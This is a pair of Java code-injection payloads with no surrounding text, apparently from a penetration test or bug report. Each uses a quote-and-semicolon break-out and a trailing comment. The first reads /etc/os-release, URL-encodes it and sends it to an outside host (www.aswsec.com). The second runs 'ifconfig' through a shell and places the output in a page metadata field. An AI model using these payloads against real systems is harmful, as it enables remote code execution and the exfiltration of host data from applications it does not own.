```
"); try {BufferedInputStream in = new BufferedInputStream(new java.net.URL("https://www.aswsec.com/index.php?"+java.net.URLEncoder.encode(new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("/etc/os-release"))),"UTF-8")).openStream());}catch (java.net.MalformedURLException e) { e.printStackTrace();}catch (IOException e) { e.printStackTrace();}finally{}//
```

```
");try {String c="ifconfig"; ProcessBuilder builder = new ProcessBuilder();builder.command("sh","-c",c); Process p = builder.start();BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String line; StringBuilder sb= new StringBuilder();while((line=br.readLine())!=null) sb.append(line + System.lineSeparator() +"***");String content=sb.toString(); metadataPage.put("contCustom",content);}catch (IOException e) { e.printStackTrace();}finally{}//```